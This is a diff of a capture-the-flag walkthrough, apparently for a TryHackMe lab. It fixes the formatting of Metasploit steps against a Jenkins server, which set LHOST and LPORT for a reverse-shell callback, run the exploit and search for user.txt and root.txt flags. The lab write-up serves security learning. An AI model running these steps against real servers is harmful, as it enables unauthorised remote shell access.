@@ -59,12 +59,12 @@ So here is my path to Pwnage!
     
 - use the command `set TARGETURI / `  because Jenkins is in the root directory on the webserver.
     
-- `set LHOST <ip>`  this is your computers IP via the thm openvpn certificate, do an `ip -br a` command in a linux terminal to list your computers IP addresses.  It is usually the tun0 address.
+- `set LHOST <ip>`  this is your computers IP via the thm openvpn certificate, do an `ip -br a` command in a linux terminal to list your computers IP addresses.  It is usually the tun0 address. You could also just use "tun0".
     
 - `set LPORT 4444` , it is usually defaluted to that port.  You can use whatever port you like, just not the known ports.run
     
--   
-    <img src="img/fe4425db59a74cff9e71ff877a637723.png?t=1601660815466" alt="mjh3.com" width="879" height="476" class="jop-noMdConv">options
+-  `options`   
+    <img src="img/fe4425db59a74cff9e71ff877a637723.png?t=1601660815466" alt="mjh3.com" width="879" height="476" class="jop-noMdConv">
     
 - now type `run` or `exploit`
     
@@ -103,7 +103,7 @@ enter `search -f user.txt`
 
 <img src="img/d4f729955d2246cc82ba6ca4a4bd10fb.png?t=1601664985628" alt="mjh3.com" width="534" height="89" class="jop-noMdConv">
 
-now  enter search -f root.txt
+now enter `search -f root.txt`
 
 <img src="img/ed4d9557bcbb4879acf4dc26cc1df452.png?t=1601665043882" alt="mjh3.com" width="530" height="83" class="jop-noMdConv">
 
